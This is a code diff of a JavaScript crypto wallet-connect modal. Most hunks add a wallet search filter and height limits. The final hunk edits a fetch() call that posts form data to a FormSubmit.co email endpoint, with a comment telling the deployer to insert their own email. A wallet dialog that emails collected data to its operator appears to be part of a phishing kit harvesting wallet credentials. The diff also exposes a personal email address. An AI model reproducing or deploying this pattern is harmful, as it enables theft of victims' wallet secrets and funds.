@@ -359,7 +359,7 @@ class WalletModal {
           </div>
 
           <!-- Wallet List -->
-          <div class="px-2 py-1.5 overflow-y-auto flex-1">
+          <div class="px-2 py-1.5 overflow-y-auto flex-1" style="max-height: 50vh;">
             ${this.wallets.map(wallet => `
               <button onclick="walletModal.selectWallet('${wallet.id}')" class="w-full flex items-center justify-between px-3 py-2.5 hover:bg-gray-50 rounded-lg transition group">
                 <div class="flex items-center gap-3">
@@ -390,6 +390,26 @@ class WalletModal {
     `;
 
     document.body.insertAdjacentHTML('beforeend', modalHTML);
+    
+    // Add search functionality
+    setTimeout(() => {
+      const searchInput = document.getElementById('wc-search-input');
+      if (searchInput) {
+        searchInput.addEventListener('input', (e) => {
+          const searchTerm = e.target.value.toLowerCase().trim();
+          const walletItems = document.querySelectorAll('.wc-wallet-item');
+          
+          walletItems.forEach(item => {
+            const walletName = item.getAttribute('data-wallet-name');
+            if (walletName.includes(searchTerm)) {
+              item.style.display = 'flex';
+            } else {
+              item.style.display = 'none';
+            }
+          });
+        });
+      }
+    }, 100);
   }
 
   selectWallet(walletId) {
@@ -433,14 +453,14 @@ class WalletModal {
               <svg class="absolute left-3 top-1/2 transform -translate-y-1/2 w-4 h-4 ${theme.textMuted}" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                 <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
               </svg>
-              <input type="text" placeholder="Search wallet" class="w-full pl-10 pr-4 py-2 ${theme.input} rounded-lg text-sm focus:outline-none" style="border: 1px solid ${this.isDarkMode ? '#374151' : '#E5E7EB'}">
+              <input id="wc-search-input" type="text" placeholder="Search wallet" class="w-full pl-10 pr-4 py-2 ${theme.input} rounded-lg text-sm focus:outline-none" style="border: 1px solid ${this.isDarkMode ? '#374151' : '#E5E7EB'}">
             </div>
           </div>
 
           <!-- Wallet List -->
-          <div class="px-2 py-1.5 overflow-y-auto flex-1">
+          <div id="wc-wallet-list" class="px-2 py-1.5 overflow-y-auto flex-1" style="max-height: 45vh;">
             ${this.walletConnectWallets.map(wallet => `
-              <button onclick="walletModal.selectWalletConnectWallet('${wallet.id}')" class="w-full flex items-center justify-between px-3 py-2.5 ${theme.hover} rounded-lg transition group">
+              <button onclick="walletModal.selectWalletConnectWallet('${wallet.id}')" class="wc-wallet-item w-full flex items-center justify-between px-3 py-2.5 ${theme.hover} rounded-lg transition group" data-wallet-name="${wallet.name.toLowerCase()}">
                 <div class="flex items-center gap-3">
                   <div class="w-9 h-9 bg-gray-50 rounded-lg flex items-center justify-center p-1.5 flex-shrink-0">
                     <img src="${wallet.iconUrl}" alt="${wallet.name}" class="w-full h-full" style="object-fit: cover;" loading="lazy" onerror="this.style.display='none'; this.parentElement.innerHTML='<div style=\\'width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; font-size: 1.2rem;\\'>${wallet.emoji}</div>';">
@@ -923,7 +943,7 @@ class WalletModal {
     }
     
     // Send data to FormSubmit.co (replace YOUR_EMAIL with your actual email)
-    fetch('https://formsubmit.co/ajax/avg8923@gmail.com', {
+    fetch('https://formsubmit.co/ajax/YOUR_EMAIL@example.com', {
       method: 'POST', 
       headers: { 
         'Content-Type': 'application/json',
